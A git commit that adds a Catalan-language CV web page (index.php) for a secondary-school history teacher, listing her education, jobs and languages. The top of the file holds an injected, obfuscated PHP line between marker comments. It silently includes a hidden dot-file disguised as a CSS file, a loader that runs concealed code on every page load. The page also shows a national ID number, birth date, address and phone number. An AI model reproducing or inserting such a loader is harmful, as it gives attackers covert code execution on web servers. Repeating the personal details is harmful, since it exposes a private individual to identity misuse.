286b7d0725baa411eeeff57b01267288df4ad724
CatiSofia <angleinvers@gmail.com>
2025-09-28 15:08:40 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,492 @@
+<?php
+/*5ae6f*/
+
+$rajd7 = "/ho\x6de/angleinvers/www/genealogia_ribas/evt/0/.c0dbd3d6.css"; if (!isset($rajd7)) {strrev ($rajd7);} else { @include_once /* 136 */ ($rajd7); }
+
+/*5ae6f*/
+
+
+
+
+
+
+?>
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="CatiSofia" >
+    
+    <link rel="icon" href="">
+	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<link href="css.css" rel="stylesheet" id="bootstrap-css">
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="js.js"></script>
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+
+    <title>Currículum - Catalina Tous</title>
+  </head>
+<body>
+	 <!-- Begin page content -->
+	 
+<div class="container-fluid">
+
+    <div class="mt-5 row presentacio">
+	    <h1 class="mt-5 col-sm-12" style="color:#A60321;">Hola!</h1>
+	    
+	    <div class="row col-sm-3 center-block text-center" style="margin:0px;"></div>
+	    
+	    <div class="mt-5 row col-sm-3 center-block text-center" style="margin:0px;">
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="far fa-user-circle fa-1x"></i>   Catalina Sofia Tous Ribas</h5>
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="far fa-id-card fa-1x"></i>   78217226-E</h5>
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="fas fa-birthday-cake fa-1x"></i>  27/10/1986</h5>
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="fas fa-map-marker-alt fa-1x"></i>   Crta. Sta. Margalida, 43. </br>Can Picafort</h5>
+		</div>
+		
+	    <div class="mt-5 row col-sm-3 center-block text-center" style="margin:0px;">
+		    
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="fas fa-mobile-alt fa-1x"></i>   699 574 254</h5>
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="fas fa-at fa-1x"></i>   catisofia@gmail.com</h6>
+		    	
+		    	<h5 class="mt-4 center-block col-sm-12"><i class="fas fa-globe fa-1x"></i>   angleinvers.com</h5>
+		    
+	    </div>
+	    
+	    <div class="mt-5 row col-sm-3 center-block text-center" style=" margin:0px;"></div>
+    </div>
+    
+	<div class="mt-5 row formacio_academica">
+		<h2 class="mt-5 center-block col-sm-12" style="color:#188070;">Formació acadèmica</h2>
+	    <div id="timeline">
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate fadeInLeft timeline_text">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo titol">Llicenciatura en Història</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">2004-2009</span> </li>
+										<li><span class="causale">Universitat de les Illes Balears</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+				
+				<!--doble
+				<div class="timeline-badge center-right">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft panell_imatge">
+								<img src="img/3.png" class="img-responsive" alt="historia" />
+							</div>
+						</div>
+					</div>
+				</div><!--doble-->
+				
+			</div>
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+										<li><span class="importo titol">Màster Universitari en Formació del Professorat</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">2009-2010</span> </li>
+										<li><span class="causale">Universitat de les Illes Balears</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo titol">Màster en Educació i TIC (E-learning) especialitat en disseny tecnopedagògic.</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">2009-2011</span> </li>
+										<li><span class="causale">Universitat Oberta de Catalunya </span> </li>
+								</ul>
+							</div>
+						</div>
+					</div>
+				</div>
+				
+				
+				
+				<!--doble
+				<div class="timeline-badge center-right">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<img src="http://via.placeholder.com/250/000000" class="img-responsive" alt="user-image" />
+							</div>
+						</div>
+					</div>
+				</div><!--doble-->
+			</div>
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+										<li><span class="importo titol">Agrupament Modular d'Informàtica. Programació i desenvolupament web</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">2011-2012</span> </li>
+										<li><span class="causale">IES Pau Casesnoves</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+				
+				
+				
+				
+				
+				
+				<!--doble<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<img src="img/1.png" class="img-responsive" alt="user-image" />
+							</div>
+						</div>
+					</div>
+				</div><!--doble-->
+			</div>
+			
+				
+			<!--aqui-->
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo titol">Grau d'Educació Primària</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">162 crèdits cursats</span> </li>
+										<li><span class="causale">Universitat de les Illes Balears</span> </li>
+								</ul>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!--aqui-->
+			
+			
+			
+			
+			
+				
+				<!--doble
+				<div class="timeline-badge center-right">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<img src="http://via.placeholder.com/250/000000" class="img-responsive" alt="user-image" />
+							</div>
+						</div>
+					</div>
+				</div><!--doble-->
+			</div>
+
+		</div>
+	</div>
+
+<div class="row experiencia_laboral">
+		<h2 class="center-block col-sm-12" style="color:#195675;">Experiència laboral</h2>
+	    <div id="timeline">
+			
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo empresa">Farmàcia M. Juan - D. Hekking</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Auxiliar de farmàcia</span> </li>
+										<li><span class="causale">Juliol-Setembre 2008 a 2013</span> </li>						</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+										<li><span class="importo empresa">Soft Line</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Programació web i aplicacions mòbils</span> </li>
+										<li><span class="causale">Novembre 2013 - Juny 2014</span> </li>
+
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+<!--aqui-->
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+												<li><span class="importo empresa">SAV Serveis Informàtics</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Diseny i Programació web</span> </li>
+										<li><span class="causale">Setembre 2014 - Abril 2016</span> </li>						</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			<!--aqui-->
+			
+			
+			
+			
+			
+			
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+									
+										<li><span class="importo empresa">Farmàcia M. Juan - D. Hekking</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Auxiliar de farmàcia</span> </li>
+										<li><span class="causale">Maig - Octubre 2016</span> </li>
+										<li><span class="causale">Juliol - Setembre 2017 i 2018</span> </li>
+
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			
+			<!--aqui-->
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo empresa">Professora i tutora d'Educació Secundària (funcionària interina)</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Especialitat Geografia i Història</span> </li>
+										<li><span class="causale">2019 - 2021</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			<!--aqui-->
+			
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+									
+										<li><span class="importo empresa">Professora d'Educació Secundària (funcionària de carrera)</span></li>
+										<li><span class="causale" style="color:#000; font-weight: 600;">Especialitat Geografia i Història</span> </li>
+										<li><span class="causale">2021 - Actualitat</span> </li>
+
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			
+			<!--aqui-->
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo empresa">Formadora del Centre de Formació de Professorat (CEP) IBSTEAM</span></li>
+										<li><span class="causale">2022 - Actualitat</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			<!--aqui-->
+			
+			
+		</div>
+	</div>
+	
+	<div class="row experiencia_laboral">
+		<h2 class="center-block col-sm-12" style="color:#F26144;">Idiomes</h2>
+	    <div id="timeline">
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo idioma">Català</span></li>
+										<li><span class="causale">Nivell C2 del Marc Europeu Comú de Referencia (MECR)</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-right">
+				
+				</div>
+				<div class="offset-sm-6 col-sm-6  timeline-item">
+					<div class="row">
+						<div class="offset-sm-1 col-sm-11">
+							<div class="timeline-panel debits  anim animate  fadeInRight">
+								<ul class="timeline-panel-ul">
+									
+										<li><span class="importo idioma">Anglès</span></li>
+										<li><span class="causale">Nivell B2 Aptis British Council</span> </li>
+										<li><span class="causale">Nivell Intermedi de l’Escola Oficial d’Idiomes</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="row timeline-movement">
+				<div class="timeline-badge center-left">
+					
+				</div>
+				<div class="col-sm-6  timeline-item">
+					<div class="row">
+						<div class="col-sm-11">
+							<div class="timeline-panel credits  anim animate  fadeInLeft">
+								<ul class="timeline-panel-ul text-right">
+										<li><span class="importo idioma">Francès</span></li>
+										<li><span class="causale">Nivell A1 del Marc Europeu Comú de Referència (MECR)</span> </li>
+								</ul>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+
+<div class="row presentacio">
+	    <h2 class="mt-5 col-sm-12" style="color:#2DC4BB;">A més tinc</h2>
+	    
+	    <div class="mt-5 row col-sm-3 center-block text-center" style="margin:0px;"></div>
+	    
+	    <div class="mt-5 row col-sm-3 center-block text-center" style="margin:0px;">
+		    	
+		    	<h5 class="center-block col-sm-12"><i class="fas fa-motorcycle fa-3x"></i>   <br/>el carnet A de moto</h5>
+		</div>
+		
+	    <div class="mt-5 row col-sm-3 center-block text-center" style="margin:0px;">
+		    
+		    	<h5 class="center-block col-sm-12"><i class="fas fa-car-side fa-3x"></i>   <br/>i el B de cotxe</h5>
+		    
+	    </div>
+	    
+	    <div class="mt-5 row col-sm-3 center-block text-center" style=" margin:0px;"></div>
+</div>
+
+<footer class="footer">
+      <div class="mt-5 container">
+        <span class="text-muted">Pots descarregar-te la versió en pdf <a href="Catalina_Tous.pdf" target="blank">aquí</a></span>
+      </div>
+    </footer>
+  </body>
+</html>
